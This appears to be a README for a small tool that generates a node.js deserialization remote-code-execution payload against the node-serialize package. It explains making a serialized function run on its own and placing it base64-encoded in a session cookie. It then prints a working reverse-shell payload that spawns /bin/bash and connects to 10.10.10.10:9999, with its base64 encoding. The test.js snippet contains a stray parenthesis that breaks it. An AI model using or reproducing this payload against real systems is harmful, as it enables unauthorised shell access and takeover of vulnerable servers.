# Nodejs_RCE

## Description

A quick make for a node.js rce base64 encoded value

## Usage

Read the script and edit the IP, PORT (maybe payload, escape the double quotes!!)

## More info on the RCE (Serailize test)

Setup environment!

```bash
sudo apt-get install node
sudo apt-get install npm
npm install node-serialize
```

test.js file

```
var y = {
 "email": function(){ return "hello"; })},
}
var serialize = require('node-serialize');
var payload_serialized = serialize.serialize(y);
console.log("Serialized: \n" + payload_serialized);
```

We auto execute the code adding () at the end 

```
var y = { "email": function(){ return "hello"; })}()}
```

Then base64 encoded the value to add to a session= cookie. 

## Script output

```
Payload
{"email":"_$$ND_FUNC$$_function(){ var net = require(\"net\"), sh = require(\"child_process\").exec(\"/bin/bash\");var client = new net.Socket();client.connect(9999, \"10.10.10.10\", function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});}()"}
Base64
eyJlbWFpbCI6Il8kJE5EX0ZVTkMkJF9mdW5jdGlvbigpeyB2YXIgbmV0ID0gcmVxdWlyZShcIm5ldFwiKSwgc2ggPSByZXF1aXJlKFwiY2hpbGRfcHJvY2Vzc1wiKS5leGVjKFwiL2Jpbi9iYXNoXCIpO3ZhciBjbGllbnQgPSBuZXcgbmV0LlNvY2tldCgpO2NsaWVudC5jb25uZWN0KDk5OTksIFwiMTAuMTAuMTAuMTBcIiwgZnVuY3Rpb24oKXtjbGllbnQucGlwZShzaC5zdGRpbik7c2guc3Rkb3V0LnBpcGUoY2xpZW50KTtzaC5zdGRlcnIucGlwZShjbGllbnQpO30pO30oKSJ9
```
